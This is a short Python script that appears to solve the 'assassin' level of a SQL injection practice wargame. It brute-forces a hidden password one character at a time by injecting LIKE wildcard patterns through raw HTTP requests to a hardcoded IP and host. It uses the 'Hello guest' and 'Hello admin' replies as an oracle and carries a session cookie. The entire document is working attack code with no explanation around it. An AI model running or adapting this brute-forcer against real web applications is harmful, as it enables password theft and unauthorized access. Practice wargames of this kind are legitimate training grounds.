import socket
def assasin_low(array, count):
    if count >= 8:
        return (array, 0)
    
    for x in "abcdefghijklmnopqrstuvwxyz0123456789":
        send = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
        send.connect(("104.27.174.42", 80))
        data = "GET /assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php?pw=" + array + x + "%25 HTTP/1.1\r\n" + \
               "Host: los.eagle-jump.org\r\n" + \
               "Cookie: __cfduid=dda4d8e6a10d2d630e0b224675adf7ff21489487743; PHPSESSID=hatjq6rg863jh2471kv73gunm4\r\n" + \
               "\r\n"
        
        send.send(data.encode())
        recv = send.recv(10000)

        if "Hello guest" in recv.decode():
            array += x
            print(array)
            count += 1
            array, sign = assasin_low(array, count)
            if sign == 0:
                array = array[0: -1]
                continue

            else:
                return (array, 1)

        elif "Hello admin" in recv.decode():
            print(array + x)
            return (array + x, 1)

        else:
            pass

    return (array, 0)

def assasin():
    array, sign = assasin_low('', 0)
    return array

array = assasin()
print(array)
